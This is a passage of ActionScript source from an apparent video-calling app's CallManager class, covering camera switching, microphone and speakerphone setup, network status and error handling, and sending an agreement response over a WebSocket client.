							microphone.gain = 0;
							
				callVO.mute = microphone.gain == 0;
				S_CALLVO_CHANGED.invoke();
			}
			
			/**
			 * Changing camera
			 * @param	value int -1, switch, 0 - back, 1 - front
			 */
			public function changeCamera(value:int =-1):void{
				if (callVO == null || callVO.uid == null)
					return;
					
				if (callVO.mode == MODE_AUDIO)
					return;
				
				if (value<-1 || value>1)
					value = 0;
					
				if (value ==-1)
					value = (callVO.cameraIndex == 0)?1:0;
				
				callVO.cameraIndex = value;
				
				refreshCamera();
				
				S_CALLVO_CHANGED.invoke();
			//	sendBroadcastMode();
			}
			
			/**
			 * Переключаем динамики, создаем микрофон
			 * @param	loudspeaker - Boolean: if false - loadspeaker off
			 */
			private function switchSpkeakers(loudspeaker:Boolean):void {
				loudspeaker = true;
				microphone = null;
				if (outgoingNS != null) {
					outgoingNS.attachAudio(null);
					
					// if (callVO.loudspeaker == true && callVO.farEncMic && callVO.nearEncMic) {
					if (callVO.farEncMic && callVO.nearEncMic && loudspeaker) {
						echo("CallManager", "switchSpkeakers","use Enchanced Microphone");	
						try {
							microphone = Microphone.getEnhancedMicrophone();
						} catch (e:Error) {
							echo("CallManager", "switchSpkeakers", "can`t get enc mic");
						}
					}
					
					
					try {
						microphone = Microphone.getEnhancedMicrophone();
					} catch (e:Error) {
						echo("CallManager", "switchSpkeakers", "can`t get enc mic");
					}
					
					
					if (microphone == null) {
						microphone = Microphone.getMicrophone();
						microphone.setUseEchoSuppression(true);
					}
					
					microphone.setSilenceLevel(0);
					microphone.encodeQuality = encodeQuality;
					microphone.framesPerPacket = framesPerPacket;
					microphone.rate = rate;
					microphone.codec = soundCodec;
					microphone.gain = gain;
				}
				
				//echo("CallManager", "switchSpkeakers", "callVO.farEncMic: " + callVO.farEncMic + "; callVO.nearEncMic: " + callVO.nearEncMic + "; loudspeaker: " + loudspeaker);
				if (loudspeaker == true) {
					SoundMixer.audioPlaybackMode = AudioPlaybackMode.MEDIA;
					if (!Config.PLATFORM_APPLE) {
						SoundMixer.useSpeakerphoneForVoice = true; // Do not set on ios ? 
					}
				}else {
					SoundMixer.audioPlaybackMode = AudioPlaybackMode.VOICE;
					if (!Config.PLATFORM_APPLE) {
						SoundMixer.useSpeakerphoneForVoice = false; // if You are on iOS and other is iOS - do not set use speakeerphone for voice to true ( according to Adobe Documentation) 
					}
				}
				
				if (outgoingNS != null)
					outgoingNS.attachAudio(microphone);
			}
			
			private function nsStatus(e:StatusEvent):void{
				echo("CallManager", "nsStatus", e.code);
			}
			
			private function onNetData(e:NetDataEvent):void { }
			
			
			// Отслеживаем netStatus
			private function ncNetStatus(e:NetStatusEvent):void{
				
				if(e.info.code == NetStatus.NC_CONNECT_SUCCESS){
					echo("CallManager", "ncNetStatus", "Connected");
					startPublishing();
					return;
				}
				
				//TODO - net closed, failed, rejectd
				
				if(e.info.code == NetStatus.NC_CONNECT_FAIL){
					echo("CallManager", "ncNetStatus", "FAIL");
					return;
				}
				
				// не факт что это конец разговора
				if(e.info.code == NetStatus.NS_PLAY_STREAM_NOT_FOUND){
					echo("CallManager", "ncNetStatus", "NS_PLAY_STREAM_NOT_FOUND");
					return;
				}
				
				if(e.info.code == NetStatus.NS_PLAY_RESET){
					echo("CallManager", "ncNetStatus", "NS_PLAY_RESET");
					return;
				}
				
				if(e.info.code == NetStatus.NS_VIDEO_DIMM_CHANGE){
					echo("CallManager", "ncNetStatus", "NS_PLAY_RESET");
					S_VIDEO_SIZE_CHANGED.invoke();
					return;
				}
				
				if(e.info.code == NetStatus.NS_PLAY_START){
					echo("CallManager", "ncNetStatus", "NS_PLAY_START");
					return;
				}
				
				if(e.info.code == NetStatus.NS_PUBLISH_START){
					echo("CallManager", "ncNetStatus", "NS_PUBLISH_START");
					return;
				}
				
				if (e.info.code == NetStatus.NS_PLAY_PUBLISH_NOTIFY){
					echo("CallManager", "ncNetStatus", "NS_PLAY_PUBLISH_NOTIFY");
					return;
				}
				
				echo("CallManager", "ncNetStatus",e.info.code);
			}
			
			private function ncSecError(e:SecurityErrorEvent):void{
				echo("CallManager", "ncSecError", e.text, true);
				networkError("SecurityErrorEvent " + e.text);
			}
			
			private function ncIoError(e:IOErrorEvent):void{
				echo("CallManager", "ncIoError", e.text, true);
				networkError("IOErrorEvent " + e.text);
			}
			
			private function ncAsyncError(e:AsyncErrorEvent):void{
				echo("CallManager", "ncAsyncError", e.text, true);
				networkError(e.text);
			}
			
			public function getTotalVideoRecognitionStates():int{
				return totalVideoRecognitionStates;
			}
			
			public function getMicrophone():Microphone{
				return microphone;
			}
			
			public function getNC():NetConnection {
				return nc;
			}
			
			public function setMicrophoneMuted(val:Boolean):void {
				microphoneMuted = val;
			}
			
			public function sendRtoResponse(accepted:Boolean, rto:RtoAgreementData):void {
				var method:String;
				if (accepted == true) {
					method = "call_rtoAccept";
				}else {
					method = "call_rtoDecline";
				}
				
				var rtoData:Object = {};
				if (rto != null) {
					rtoData = rto.toObject();
				}
				
				WSClient.call_blackHole([callVO.uid, Auth.uid], method, { data:rtoData } )
			}
			
			public function getStreamId():String 
			{
				return streamID;
			}
			
			public function isConnected():Boolean 
			{
				return connected;
			}
			
			public function dispose():void 
			{
				//!TODO:;
				closeMediaNetwork();
			}
		}
}